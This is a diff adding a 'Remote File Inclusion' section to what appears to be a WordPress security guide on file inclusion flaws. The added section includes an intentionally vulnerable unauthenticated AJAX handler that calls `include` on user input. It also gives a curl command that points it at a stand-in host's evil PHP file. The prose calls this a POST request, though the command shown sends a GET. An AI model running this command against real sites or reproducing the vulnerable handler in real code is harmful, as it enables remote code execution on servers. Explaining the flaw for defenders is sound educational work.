@@ -5,6 +5,7 @@ head:
       content: Learn about Local File Inclusion (LFI)
 contributors:
     - rafiem
+    - dhakalananda
 ---
 
 import { LinkCard } from '@astrojs/starlight/components';
@@ -56,3 +57,29 @@ Below are some of the findings related to Local File Inclusion:
 - [Security Vulnerability In OceanWP Theme \<= 3.4.1](https://patchstack.com/articles/subscriber-path-traversal-leading-to-local-file-inclusion-in-oceanwp-theme/)
 - [Vulnerability In Rank Math SEO Plugin](https://patchstack.com/articles/authenticated-path-traversal-leading-to-local-file-inclusion-in-rank-math-seo-plugin/)
 - [Multiple Critical Vulnerabilities Fixed In LearnPress Plugin Version \<= 4.1.7.3.2](https://patchstack.com/articles/multiple-critical-vulnerabilities-fixed-in-learnpress-plugin-version/)
+
+## Remote File Inclusion
+
+If both the PHP options `allow_url_fopen` and `allow_url_include` are turned on in the PHP configuration, a remote file inclusion is possible which allows an even easier access to executing arbitrary PHP code on the server. It allows a malicious user to add the remote PHP file to be executed leading to code execution unlike LFI where a local file needs to be available.
+
+## Example Cases
+
+Similar to the above case, below is an example vulnerable scenario if the mentioned options are enabled in the PHP configuration:
+
+```php
+add_action("wp_ajax_nopriv_render_lesson", "render_lesson_template");
+
+function render_lesson_template(){
+    $template_path      = urldecode( $_GET['template_path'] ?? '' );
+
+    // For custom template return all list of lessons
+    include $template_path;
+    die();
+}
+```
+
+To exploit this, any unauthenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the external link to the PHP code to trigger the `include` function.
+
+```bash
+curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=render_lesson&template_path=https://example.com/evil-file.php
+```
